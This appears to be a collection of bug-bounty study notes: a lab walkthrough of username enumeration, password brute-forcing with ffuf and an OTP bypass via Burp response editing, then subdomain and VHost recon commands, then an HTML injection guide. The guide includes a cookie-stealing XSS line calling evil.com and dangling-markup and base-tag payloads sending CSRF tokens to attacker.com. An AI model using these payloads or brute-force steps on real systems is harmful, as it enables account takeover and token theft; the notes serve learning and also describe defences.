awk 'length($0) == 12 && /[a-z]/ && /[A-Z]/ && /[0-9]/ && /^[[:alnum:]]+$/' \
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt \
> custom_wordlist.txt

Step 3: Perform Username Enumeration

Before attempting a password brute-force attack, determine whether the application responds differently to valid and invalid usernames.

Test the following credentials.

Test 1 — Potentially valid username:

Username: bavly
Password: 123456

Response:

Invalid credentials.

Test 2 — Potentially invalid username:

Username: hacker
Password: 123456

Response:

Unknown username or password.

The different error messages may indicate that the application handles existing and nonexistent usernames differently. Confirm this behavior with repeated controlled tests before relying on it.

Automate username enumeration with FFUF

ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
-u http://<IP>:<PORT>/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=invalid" \
-fr "Unknown username or password."

Result for Username Enumeration: gladys

Step 4: Brute-Force the Password for a Valid Username

Once you have identified a valid username gladys, use the custom password wordlist generated in Step 2 to test password candidates.

ffuf -w ./custom_wordlist.txt \
-u http://<IP>:<PORT>/login.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=gladys&password=FUZZ" \
-fr "Invalid credentials."

Result: gladys:dWinaldasD13

Step 5: Bypassing OTP Authentication

After submitting the login credentials gladys:dWinaldasD13, we notice that the application requires an OTP (One-Time Password) to complete the authentication process. We will test two possible approaches to bypass this step.

Method 1: OTP Brute-Force (Section 6)

  1. Follow the OTP brute-force technique covered in Section 6.
  2. Attempt to identify the correct OTP using the available testing method.
  3. Result: The attempt was unsuccessful, and we could not discover the correct OTP.

Method 2: Direct Access Bypass (Section 10)

  1. Open Burp Suite and enable Proxy interception.
  2. Request the protected endpoint /profile.php after submitting the login credentials.
  3. Inspect the server response and check whether it contains protected page content alongside a 302 Found redirect.
  4. If necessary, enable Do intercept → Response to this request to inspect the response before forwarding it.
  5. In the authorized lab, change the response status from 302 Found to 200 OK, then forward the response to observe how the browser handles the returned content.

Result: The second method worked. We were able to access and display the profile page directly without successfully completing the OTP verification.

docs.title: 1. Fundamentals of Subdomain Enumeration
docs.text: Subdomain enumeration is the foundational starting point of modern web reconnaissance and bug bounty hunting. Finding hidden, forgotten, or unindexed subdomains expands your target's attack surface and unlocks unique vulnerabilities before other security researchers discover them.

docs.title: What is a Subdomain?
docs.text:
A domain name follows a hierarchical structure:

  • Top-Level Domain (TLD): .com, .org, .net, .io.
  • Root Domain (Apex/Second-Level Domain): The primary organizational domain (example.com, paypal.com).
  • Subdomain: A child domain created under the root domain (blog.example.com, api.paypal.com, drive.google.com).

Organizations use subdomains to separate distinct environments, web applications, microservices, and internal administrative portals.

docs.title: Passive vs. Active Enumeration
docs.text:
• Passive Enumeration: Gathers subdomains from third-party databases, search archives, and public logs without sending direct network packets to the target's servers. It is 100% stealthy and leaves no traces in server logs.
  • Active Enumeration: Directly interacts with target name servers, web application firewalls (WAFs), and DNS infrastructure via direct queries, brute-forcing, HTTP requests, or web crawling.

docs.title: Certificate Transparency
docs.text:
Certificate Transparency (CT) logs are public, append-only records of every SSL/TLS certificate issued by Certificate Authorities (CAs), making them a powerful, passive source for subdomain enumeration.

Manual Search: crt.sh — search %.example.com

Command line:

curl -s 'https://crt.sh/?q=%25.example.com&output=json' \
  | jq -r '.[].name_value' \
  | tr '\r' '\n' \
  | sed 's/^\*\.//' \
  | sort -u

docs.title: Subfinder
docs.text:
Reference: Recon with Me !!! — Dhiyanesh Geek This section summarizes and expands on the practical lessons described by Dhiyanesh Geek regarding the importance of configuring API keys in Subfinder before relying on its output.

Subfinder's true power comes from its passive API sources. Without API keys, you're only scratching the surface. With free API keys configured (~/.config/subfinder/provider-config.yaml), Subfinder queries dozens of additional databases — in Dhiyanesh Geek's documented case, this produced 114,817 extra subdomains compared to running without keys.

The only downside is slightly slower scans. Store keys in the config file — never hardcode them. Recommended free sources: binaryedge, censys, certspotter, chaos, github, intelx, passivetotal, robtex, securitytrails, shodan, urlscan, virustotal, zoomeye.

verify that your API keys are actually working, use -v (verbose): 

subfinder -d example.com -v

The verbose output shows which sources succeeded, which failed, and how many results each returned. A source returning 0 results or showing an error is the real sign of a broken key.

Single Domain 

subfinder -d example.com -all -silent -recursive -o subs0.txt

File of Domains 

subfinder -dL domains.txt -all -silent -recursive -o subs0.txt

The problem isn't missing words — it's missing patterns.

docs.title: Permutations
docs.text:
Organizations reuse naming conventions. If one name exists, related names likely exist too.

Common patterns to combine with discovered names:

Type Examples Environment dev, test, qa, uat, stage, staging, prod, beta, alpha, sandbox, legacy, old, backup, internal, private Numeric api1, api2, api01, web01, app01, v1, v2, v3 Region us, eu, uk, apac, us-east, eu-west

Structural combinations (from api + environment words):

{{sub}}-{{word}}.{{suffix}}      →  api-dev.example.com
{{word}}-{{sub}}.{{suffix}}      →  dev-api.example.com
{{word}}.{{sub}}.{{suffix}}      →  dev.api.example.com
{{sub}}.{{word}}.{{suffix}}      →  api.dev.example.com

Tooling:

# alterx — pattern-based permutations
cat resolved.txt | alterx -silent > permutations.txt

# Gotator — advanced permutations with depth control
gotator -sub live_subs.txt -perm words.txt -depth 1 -numbers 10 -mindup -adv -md | sort -u > permutations.txt

Resolve the candidates:

puredns resolve permutations.txt -r resolvers.txt

Generated names are only candidates until DNS confirms them.

docs.title: Recursive Enumeration
docs.text:
Use discovered subdomains as new roots.

When useful: Deep naming patterns like prod.api.example.com, us-east.api.example.com.

When not: Flat naming like www, api, mail.

How:

  1. Count the most frequent 2nd/3rd-level zones in your results
  2. Re-run passive tools against those intermediate roots
  3. Merge and resolve

        ↓
Phase 3: Merge
cat *.txt | sort -u > candidates.txt
        ↓
Phase 4: DNS Resolution
dnsx -l candidates.txt -o resolved.txt
        ↓
Phase 5: HTTP Probing
httpx -l resolved.txt -o live.txt

docs.title: DNS vs VHost
docs.text:
DNS brute force: Does foo.example.com exist in DNS?

VHost fuzzing: Does the web server behave differently when Host: foo.example.com?

A single IP may host multiple applications:

www.example.com
admin.example.com
internal.example.com
dev.example.com

The server decides which app to serve based on the HTTP Host header — even when DNS doesn't expose every hostname.

docs.title: Step 1: Add the Target to /etc/hosts
docs.text:
Before running any VHost fuzzing tool, map the target IP to its domain locally:

sudo nano /etc/hosts
203.0.113.10    target.com

This ensures the hostname resolves to the correct IP — essential for HTTPS/SNI, browser testing, and tools that don't support custom IP resolution.

docs.title: Step 2: VHost Fuzzing
docs.text:
# ffuf
ffuf -w wordlist.txt -u https://target.com -H "Host: FUZZ.target.com" -fc 403,404 -ac

# Gobuster
gobuster vhost -u https://target.com --useragent "Pentest-Recon" -w wordlist.txt

docs.title: False Positive Filtering
docs.text:
Servers often return a default fallback page for any unknown Host header — producing thousands of false positives if you only filter by status code.

Filter by response metrics:

Flag Filters by -fs Response size -fw Word count -fl Line count -ac Auto-calibration (baseline detection)

Behavioral differences matter: if every candidate returns the same 200, same size, same title — they're likely the default vhost, not real hosts.

docs.title: Horizontal vs Vertical
docs.text:
Vertical: example.com → *.example.com → *.api.example.com

Horizontal: example.com → IP → ASN → CIDR → PTR → hostnames

docs.title: ASN & IP Ranges
docs.text:
ASN (Autonomous System Number) is a unique number that identifies a large network managed by a single organization.

**Find ASN via bgp.he.net or HackerTarget or using whois

dig +short tesla.com
whois <Target_ip>
amass intel -org "Tesla"

Find the IP Ranges Inside an ASN:

whois -h whois.radb.net -- '-i origin AS394161' | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]+' | sort -u >> ip_ranges.txt
echo "AS394161" | asnmap -silent >> ip_ranges.txt

ASN ownership ≠ every IP in scope. Verify authorization.

docs.title: Reverse DNS (PTR)
docs.text: Once you have the IP ranges (ip_ranges.txt), the next step is reverse DNS — turning IPs back into hostnames.

docs.title: 1. Expand CIDRs into Individual IPs
docs.text: cat ip_ranges.txt | mapcidr -silent > ips.txt

docs.title: 2. Reverse DNS (PTR Lookups)
docs.text:
cat ips.txt | dnsx -ptr -resp-only -o ptr_records.txt

Or in one pipeline:

cat ip_ranges.txt | mapcidr -silent | dnsx -ptr -resp-only -o ptr_records.txt

docs.title: 3. Filter Results to Your Target
docs.text: grep -E '\.tesla\.com$' ptr_records.txt | sort -u > tesla_hostnames.txt

docs.title: Merging
docs.text:
Combine all source files into one deduplicated list:

cat recon/*.txt \
  | tr 'A-Z' 'a-z' \
  | sed 's/^\*\.//' \
  | sed 's/\.$//' \
  | sort -u \
  > recon/all-passive.txt
  • tr 'A-Z' 'a-z' → lowercase everything
  • sed 's/^\*\.//' → strip wildcard prefix (*.example.com → example.com)
  • sed 's/\.$//' → strip trailing dot
  • sort -u → deduplicate

docs.title: Resolve Everything
docs.text:
# DNS resolution with wildcard filtering
puredns resolve all-passive.txt -r resolvers.txt -w resolved.txt

# Extract specific records
dnsx -silent -l resolved.txt -a -aaaa -cname -resp

docs.title: HTTP Probing
docs.text: httpx -l resolved.txt -silent -status-code -title -tech-detect -follow-redirects -o httpx.txt

docs.title: Status Codes
docs.text:
Do not filter on 200 only. Useful responses include 200, 301, 302, 307, 401, 403, 404, 500.

Status Triage 200 Primary attack surface 3xx Follow redirect — may reveal another hostname 401 Test default creds, inspect headers 403 Bypass techniques (headers, path tricks, VHost) 404 Check Wayback/CDX for deprecated endpoints 500 High-value for injection testing

docs.title: Passive
docs.text:
subfinder -d example.com -all -silent -recursive -o subfinder-all.txt
subfinder -dL domains.txt -all -silent -recursive -o subfinder-all.txt
amass enum -passive -d example.com -o amass.txt
amass enum -active -d example.com -brute -w wordlist.txt -o amass-active.txt
assetfinder --subs-only example.com
findomain -t example.com -q
chaos -d example.com -silent
sublist3r -d example.com -o sublist3r.txt
github-subdomains -d example.com -t <TOKEN> -o github_subs.txt

docs.title: CT
docs.text:
curl -s 'https://crt.sh/?q=%25.example.com&output=json' \
  | jq -r '.[].name_value' | tr '\r' '\n' | sed 's/^\*\.//' | sort -u

docs.title: DNS Records
docs.text:
dig +short A api.example.com
dig +short AAAA api.example.com
dig +short CNAME api.example.com
dig +short NS example.com
dig +short MX example.com
dig +short TXT example.com
dig +short SRV _sip._tcp.example.com
dig +short SOA example.com

docs.title: Resolve + Wildcard
docs.text:
dnsx -l candidates.txt -silent -auto-wildcard -o resolved.txt
dnsx -l resolved.txt -silent -a -aaaa -cname -resp
puredns resolve candidates.txt -r resolvers.txt

docs.title: Brute Force
docs.text:
puredns bruteforce wordlist.txt example.com -r resolvers.txt
dnsx -silent -d example.com -w wordlist.txt
gobuster dns -d example.com -w wordlist.txt

docs.title: Permutations
docs.text:
cat resolved.txt | alterx -silent
gotator -sub subs.txt -perm words.txt -depth 1 -numbers 10 -mindup -adv -md
altdns -i subs.txt -o data_output -w words.txt -r -s altdns_output.txt

docs.title: PTR / ASN
docs.text:
dig -x 203.0.113.10 +short
echo "203.0.113.10" | dnsx -silent -ptr
cat ip_ranges.txt | mapcidr -silent | dnsx -ptr -resp-only
echo "AS12345" | asnmap -silent

docs.title: VHost
docs.text:
ffuf -w wordlist.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fc 403,404 -ac
gobuster vhost -u http://TARGET_IP -w wordlist.txt

docs.title: HTTP Probe
docs.text: httpx -l resolved.txt -silent -status-code -title -tech-detect -follow-redirects

docs.title: Archive
docs.text:
gau example.com
waybackurls target.com
curl "https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey"

docs.title: AXFR
docs.text:
dig +short NS example.com
dig AXFR example.com @ns1.example.com

docs.title: Normalize + Scope
docs.text:
cat *.txt | tr '[:upper:]' '[:lower:]' | sed 's/^\*\.//' | sed 's/\.$//' | sort -u
grep -E '(^|\.)example\.com

docs.title: 120. Complete Passive Pipeline
docs.text:
· 

DOMAIN=example.com

mkdir -p recon

subfinder \
  -d "$DOMAIN" \
  -all \
  -silent \
  -o recon/subfinder.txt

amass enum \
  -passive \
  -d "$DOMAIN" \
  -o recon/amass.txt

assetfinder \
  --subs-only "$DOMAIN" \
  > recon/assetfinder.txt

findomain \
  -t "$DOMAIN" \
  -q \
  > recon/findomain.txt

cat \
  recon/subfinder.txt \
  recon/amass.txt \
  recon/assetfinder.txt \
  recon/findomain.txt \
  | tr '[:upper:]' '[:lower:]' \
  | sed 's/^\*\.//' \
  | sed 's/\.$//' \
  | sort -u \
  | grep -E "(^|\.)${DOMAIN//./\\.}$" \
  > recon/all-passive.txt

docs.title: 121. Resolve the Passive Dataset
docs.text:
dnsx \
  -l recon/all-passive.txt \
  -silent \
  -auto-wildcard \
  -o recon/resolved.txt

Then collect records:

dnsx \
  -l recon/resolved.txt \
  -silent \
  -a \
  -aaaa \
  -cname \
  -resp \
  > recon/dns-records.txt

docs.title: 122. HTTP Validation
docs.text:
httpx \
  -l recon/resolved.txt \
  -silent \
  -status-code \
  -title \
  -tech-detect \
  -follow-redirects \
  -o recon/http.txt

Again:

HTTP validation

is not a replacement for DNS enumeration.

It is the next validation layer.

docs.title: 123. Brute Force
docs.text:
puredns bruteforce \
  wordlist.txt \
  "$DOMAIN" \
  -r valid_resolvers.txt \
  -o recon/bruteforce.txt

Or:

dnsx \
  -silent \
  -d "$DOMAIN" \
  -w wordlist.txt \
  -o recon/bruteforce.txt

docs.title: 124. Permutations
docs.text:
cat recon/resolved.txt \
  | alterx \
  -silent \
  > recon/permutations.txt

Resolve:

puredns resolve \
  recon/permutations.txt \
  -r valid_resolvers.txt \
  -o recon/permutations-resolved.txt

docs.title: 125. Final Merge
docs.text:
cat \
  recon/all-passive.txt \
  recon/resolved.txt \
  recon/bruteforce.txt \
  recon/permutations-resolved.txt \
  recon/recursive.txt \
  recon/vhosts.txt \
  | tr '[:upper:]' '[:lower:]' \
  | sed 's/\.$//' \
  | sort -u \
  > recon/final-candidates.txt

Then resolve everything again:

dnsx \
  -l recon/final-candidates.txt \
  -silent \
  -auto-wildcard \
  -o recon/final-resolved.txt

This final re-resolution step is important because many candidates were generated from:

historical data
permutations
brute force
VHosts
code
archives

and not all candidates will still exist.

docs.title: HTML Injection — Complete Beginner Bug Hunter Guide
1. What Is HTML Injection?
docs.text:
HTML Injection happens when an application takes attacker-controlled input and places it into an HTML page without properly encoding or sanitizing it.

The browser then interprets the injected input as HTML instead of treating it as normal text.

For example, imagine a website contains:

<h1>Welcome, USERNAME</h1>

The application expects:

Welcome, Ahmed

But an attacker supplies:

<u style="color:#2f7d4f">Injected</u>

The server might generate:

<h1>Welcome, <u style="color:#2f7d4f">Injected</u></h1>

The browser renders:

Welcome, Injected

The important point is:

The attacker did not simply change text. He changed the structure of the HTML document.

docs.title: 2. HTML Basics You Need Before Testing
docs.text:
You do not need to become an HTML expert before hunting HTML Injection.

You should understand:

<tag>content</tag>

Examples:

<p>Hello</p>
<h1>Hello</h1>
<b>Hello</b>
<i>Hello</i>
<div>Hello</div>
<a href="/profile">Profile</a>
<img src="/image.png">

HTML elements can also contain attributes:

<a href="/profile" class="button">Profile</a>

Here:

a        = tag
href     = attribute
/profile = attribute value
class    = attribute
button   = class value

docs.title: 3. How HTML Injection Happens
docs.text:
The basic vulnerability looks like this:

flowchart LR
    A[Attacker] --> B[Injects Payload]
    B --> C[Application]
    C --> D[HTML Response]
    D --> E[Browser]
    E --> F[Injected HTML]

For example:

GET /search?q=hello

Application:

<h2>Search results for: hello</h2>

Now test:

GET /search?q=<b>TEST</b>

If the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as HTML.

If instead the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as TEXT.

docs.title: 4. HTML Injection vs XSS
docs.text: HTML Injection and XSS are closely related, but they are not automatically the same finding.

docs.title: Core Difference
docs.text:
• HTML Injection: The attacker inserts basic HTML code (like <h1>, <a>, or <form>). It changes how the page looks or tricks users, but it cannot run dynamic scripts.
  • XSS (Cross-Site Scripting): The attacker inserts JavaScript code. It runs inside the victim's browser and can steal sessions, cookies, or control the user account.

Rule of Thumb

All XSS involves injecting HTML, but not all HTML injection is XSS. HTML Injection ➡️➡️ Possible XSS escalation

docs.title: Quick Comparison
docs.text: Feature HTML Injection XSS (Cross-Site Scripting) Injected Code HTML tags (<h1>, <form>) JavaScript (<script>, onerror=) Main Goal Deface page, phishing links Steal cookies, hijack sessions Cookie Access ❌ No ✅ Yes

docs.title: HTML Injection Example
docs.text:
<h1>System Error! Click <a href="http://evil.com">here</a> to login.</h1>
  • Result: The browser displays a fake link. Users are tricked into clicking it (Phishing), but no code runs automatically.

docs.title: XSS Example
docs.text:
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
  • Result: The browser executes the script instantly when the page loads and sends the victim's cookies to the attacker.

docs.title: 5.1 Reflected HTML Injection
docs.text:
The payload is sent within the HTTP request and immediately reflected back in the application's response without proper sanitization or encoding.

Example Scenario:

  • Request: /search?q=<b>TEST</b>
  • Response: <h1>Results for <b>TEST</b></h1>

Because the payload is not saved on the server, an attacker must trick a victim into clicking a crafted link containing the malicious input.

docs.title: 5.2 Stored HTML Injection
docs.text:
The application stores attacker-controlled input directly in a database or server file system, rendering it to users whenever the affected resource is rendered.

Example Scenario:

  • Stored Input: Username: <b>HACKED</b>
  • Rendered Output: Welcome <b>HACKED</b>

Common Vulnerable Locations:

  • User profiles, display names, and avatars
  • Comments, forum posts, and chat messages
  • Support tickets and internal notifications
  • Document titles, project names, and custom fields

Because stored payloads execute automatically when a page is loaded, they carry a significantly broader impact scope than reflected issues.

docs.title: 5.3 DOM-Based HTML Injection
docs.text:
The server is not directly involved in processing or reflecting the malicious payload. Instead, client-side JavaScript reads untrusted data from a sink source (like location.hash) and writes it directly into the Document Object Model (DOM) insecurely.

Example Code:

const value = location.hash.substring(1);
document.getElementById("output").innerHTML = value;

The source is:

location.hash

The sink is:

innerHTML

Think in terms of:

SOURCE → TRANSFORMATION → SINK

Common sources:

location.search
location.hash
location.pathname
document.referrer
postMessage
localStorage
sessionStorage

Common HTML sinks:

innerHTML
outerHTML
insertAdjacentHTML()
document.write()
document.writeln()

docs.title: 6. Understanding HTML Contexts
docs.text:
Important skill in HTML/XSS testing

Before creating a payload, always ask:

Where exactly does my input appear in the HTML response?

docs.title: HTML body
docs.text:
<div>YOUR_INPUT</div>
  • try: <b>HTMLTEST</b>
  • If the browser displays: HTMLTEST (you have confirmed HTMLI)

docs.title: Quoted Attribute
docs.text:
<input value="YOUR_INPUT">
<input value='USER_INPUT'>
  • try: TEST"TEST, TEST'TEST
  • If the browser displays Secure output: 
    <input value="TEST"TEST">
  • If the browser displays HTMLI: 
    <input value="TEST"TEST">
<input value='TEST'TEST'>

docs.title: Unquoted Attribute
docs.text:
<input value=USER_INPUT>
  • try: ><b>TEST</b>
  • If the browser displays HTMLI: 
    <input value=><b>TEST</b>

docs.title: Link
docs.text:
<a href="USER_INPUT">Click</a>

or:

<link href="USER_INPUT">

or:

<img src="USER_INPUT">

Testing URI schemes like javascript:alert(1) or data URIs (data:text/html,...)

docs.title: HTML Comments
docs.text:
<!-- USER_INPUT -->

Try: 

--><b>TEST</b><!--

If the comment context can be escaped, HTML injection may become possible.

docs.title: JavaScript
docs.text:
<script>
let value = "YOUR_INPUT";
</script>

docs.title: CSS
docs.text:
<style>
.example {
    background: YOUR_INPUT;
}
</style>

Each context requires different analysis.

docs.title: Step 1 — Find Input
docs.text:
Look for:

Search
Username
Display name
First name
Last name
Company
Project
Description
Comment
Bio
Ticket
Message
Document title
Tag
Category
API fields

Also test:

Query parameters
POST parameters
JSON parameters
Path parameters
Multipart fields
GraphQL variables
WebSocket messages
URL fragments

docs.title: Step 2 — Insert a Unique Marker
docs.text:
Start with:

HTMLTEST-12345

A unique marker makes reflection easy to locate.

Search for it in:

  • HTTP response
  • Page source
  • DOM
  • Browser UI

docs.title: Step 3 — Identify the Context
docs.text:
Find exactly where the marker appears.

Example:

<div>HTMLTEST-12345</div>

Context:

HTML body

docs.title: Step 4 — Test Harmless HTML
docs.text:
Start with:

<b>HTMLTEST-12345</b>
<h1>HTMLTEST-12345</h1>
<i>HTMLTEST-12345</i>
<div>HTMLTEST-12345</div>

The goal is to determine whether the browser parses the input as markup.

docs.title: Step 5 — Determine Impact
docs.text:
Document the highest impact you can actually demonstrate:

Visual modification
HTML structure manipulation
Stored cross-user rendering
Form manipulation
Potential XSS escalation

docs.title: Step 1 — Test Every Input
docs.text:
Imagine a page has these input fields:

firstname
lastname
description

I don't start with complicated payloads.

I simply put a basic HTML payload into every input:

<h1>firstname</h1>

For the firstname field.

<h1>lastname</h1>

For the lastname field.

<h1>description</h1>

For the description field.

The idea is very simple:

Give every input a unique HTML payload so I can later identify exactly which input is being reflected.

docs.title: Step 2 — Intercept the Request
docs.text:
This is the most important part of my methodology.

After entering the payload, I intercept the request using Burp Suite.

For example, the browser might normally send:

{
    "firstname": "<h1>firstname</h1>"
}

If I see that the payload was already HTML-encoded before the request was sent, I know that the client-side code modified the value.

However, if the request body contains the original payload:

{
    "firstname": "<h1>firstname</h1>"
}

then the client did not encode it before sending it.

At this point, I can manually modify the intercepted request and put the raw payload directly into the request.

For example:

{
    "firstname": "<h1>firstname</h1>"
}

This allows me to bypass client-side validation or encoding.

docs.title: Step 3 — Don't Immediately Search for the Reflection
docs.text:
After injecting the payloads, I don't necessarily start searching the website for:

<h1>firstname</h1>

<h1>lastname</h1>

<h1>description</h1>

Instead, I continue using the application normally.

I explore the different features of the application.

While testing these features, I watch what happens to the values I previously submitted.

Eventually, one of the payloads may be rendered somewhere:

<h1>firstname</h1>

or:

<h1>description</h1>

Because I used a different payload for every input, I immediately know which input is responsible.

For example:

<h1>description</h1>

appears on the dashboard.

I immediately know:

Input: description
Location: dashboard
Vulnerability: HTML Injection

docs.title: The Complete Workflow
docs.text:
My methodology can be summarized like this: 

flowchart TD
    A[Find Input] --> B[Insert Unique HTML Payload]
    B --> C[Intercept Request with Burp]
    C --> D[Check Request Body]

    D --> E{Payload Encoded?}

    E -->|Yes| F[put the raw payload directly]
    E -->|No| G[Continue Testing]

    F --> H[Use the Application]
    G --> H

    H --> I[Test Different Features]
    I --> J[Payload Gets Reflected / Stored]
    J --> K[Identify Vulnerable Input]
    K --> L[Validate Impact Safely]
    L --> M[Report the Bug]

docs.title: 9. Base Tag Injection
docs.text:
Reference: Base tag HTML injection: A guide for pentesters This section summarizes and expands on the Base tag HTML injection described by punksecurity.

The <base> HTML element specifies the baseline URL used to resolve all relative paths (scripts, stylesheets, images) across a document.

<base href="https://attacker.com/">

docs.title: Attack Mechanics
docs.text:
If an application allows injecting into the <head> section or prior to relative resource tags:

<!-- Injected Payload -->
<base href="https://attacker-controlled.com/">

<!-- Existing Application Code -->
<script src="/assets/app.js"></script>
<img src="/images/logo.png">

The browser resolves relative paths against the attacker's base URL: * Expected Script: https://target.com/assets/app.js * Hijacked Script: https://attacker-controlled.com/assets/app.js

docs.title: Mitigation
docs.text:
Implement the CSP base-uri directive: 

Content-Security-Policy: base-uri 'self';

docs.title: 10. Dangling Markup Injection (Data Exfiltration Without JavaScript)
docs.text:
Reference: Dangling Markup - HTML scriptless injection — HackTricks This section summarizes and expands on the basic techniques described by HackTricks

Dangling Markup Injection is an advanced HTML Injection technique used to exfiltrate sensitive data (CSRF tokens, session secrets, personal data) from the DOM without requiring JavaScript execution.

This approach is particularly lethal when strict Content Security Policies (CSP) block inline scripts (unsafe-inline) or <script> elements.

docs.title: 1) Core Mechanics & Concept
docs.text:
Dangling Markup relies on injecting an unclosed HTML tag containing an open quotation mark:

<img src='https://attacker.com/log?data=

When the browser parses this payload, it treats the open quote (') as the start of the src attribute value. Because no closing quote exists within the injected block, the browser consumes all subsequent HTML content as string data until it encounters the first matching quote (') in the page source.

docs.title: Exfiltration Scenario
docs.text:
Consider a vulnerable page rendering a hidden CSRF token inside a form where attributes use double quotes ("), followed by a link using single quotes ('):

<div>
    <img src='https://attacker.com/log?data=
</div>

<form action="/transfer" method="POST">
    <input type="hidden"
           name="csrf_token"
           value="SECRET_TOKEN_998877">

    <button type="submit">
        Confirm
    </button>
</form>

<a href='https://target.example/profile'>
    Profile
</a>

docs.title: Browser Interpretation
docs.text:
Because the injected src attribute opens with a single quote ('), the browser ignores all double quotes (") inside the <form> and <input> tags. It merges the entire DOM segment into the src attribute string until it encounters the first matching single quote (') in <a href='...:

<img src='https://attacker.com/log?data=</div><form action="/transfer" method="POST"><input type="hidden" name="csrf_token" value="SECRET_TOKEN_998877"><button type="submit">Confirm</button></form><a href='

docs.title: HTTP Request Sent to Attacker
docs.text:
The browser automatically fires an outbound GET request to the attacker's server, leaking the sensitive CSRF token within the request query string:

GET /log?data=%3Cdiv%3E%3Cform%20action=%22/transfer%22%20method=%22POST%22%3E%3Cinput%20type=%22hidden%22%20name=%22csrf_token%22%20value=%22SECRET_TOKEN_998877%22%3E%3Cbutton%20type=%22submit%22%3EConfirm%3C/button%3E%3C/form%3E%3Ca%20href= HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0...

Result: The secret SECRET_TOKEN_998877 is exfiltrated to attacker.com without executing any JavaScript.

docs.title: Image & Media Elements (Zero-Click)
docs.text:
Image tags automatically trigger outbound requests upon DOM parsing without requiring user interaction: 

<img src='https://attacker.com/log?body=
<img src='//attacker.com/log?data=

docs.title: Meta & Form Redirects
docs.text:
Meta tags and form action hijacking can capture input fields or force redirections: 

<!-- Meta refresh redirection with dangling query -->
<meta http-equiv="refresh" content='0; url=https://attacker.com/log?data=

<!-- Form action hijacking -->
<form action='https://attacker.com/log'><input type="submit" value='

docs.title: Link & Font Stylesheets
docs.text:
External stylesheet inclusions trigger data leakage during CSS parsing: 

<link rel="stylesheet" href='https://attacker.com/log?data=

docs.title: 3) Modern Browser Defenses & Mitigations
docs.text:
Modern browser engines (Chromium, Firefox, WebKit) have introduced structural defenses against multiline dangling markup attacks:

  • Newline Blockers in Resource URLs: Browsers automatically reject or strip outbound requests for media resources (<img>, <audio>, <video>, <link>) if the URL string contains raw line breaks (\n or \r).

  • Bypass Constraints:

    1. Single-Line Context: If the target secret and injected payload reside on the same line (no line breaks between the injection point and the secret), exfiltration still succeeds in modern browsers.
    2. Form Action Redirection: Using <form action="..."> and forcing user submission can bypass resource URL newline restrictions.

  • Remediation & Defense-in-Depth:

    1. Strict Context-Aware Encoding: Encode single quotes (' as ') and double quotes (" as ") to prevent escaping attribute contexts.
    2. Content Security Policy (CSP): Restrict destination origins using strict img-src, default-src, and connect-src directives (e.g., Content-Security-Policy: default-src 'self'; img-src 'self';).
    3. SameSite Cookie Protections: Enforce SameSite=Strict or SameSite=Lax on sensitive session cookies.

docs.title: Impact Scenario (Similar to a Bug I Discovered)
docs.text:
The first three payloads can significantly increase the impact of an HTML Injection vulnerability

Consider the following scenario:

  • An attacker has an HTML Injection vulnerability in their display name. The application is an organization-management platform where an administrator can remove members.

  • When an administrator attempts to remove a member, the application displays a confirmation dialog asking whether the administrator wants to proceed with the deletion.

  • Because the attacker's injected HTML is rendered inside this dialog, the payload can affect the administrator's interface.

docs.title: 1. Automatic Redirect
docs.text:
The first payload can trigger a redirect when the administrator opens the confirmation dialog.

Instead of remaining on the legitimate application, the administrator can be redirected to an attacker-controlled page. This could potentially be used to present a deceptive page requesting additional information.

docs.title: 2. Full-Screen Overlay
docs.text:
The second payload can place a full-screen element over the application's interface.

As a result, the administrator may no longer be able to interact with the underlying confirmation dialog, including the Delete button.

docs.title: Practical Impact
docs.text:
In this scenario, the attacker-controlled member could become effectively undeletable through the normal UI, because opening the confirmation dialog causes the administrator's interface to be redirected, covered.

flowchart TD
    A["Attacker's Display Name"] --> B["HTML Injection"]
    B --> C["Administrator Opens Delete Confirmation"]
    C --> D["Injected HTML Executes"]

    D --> E["Redirect"]
    D --> F["Full-Screen Overlay"]

    E --> H["Administrator Cannot Normally Interact With the Dialog"]
    F --> H

    H --> I["Delete Action Becomes Inaccessible"]
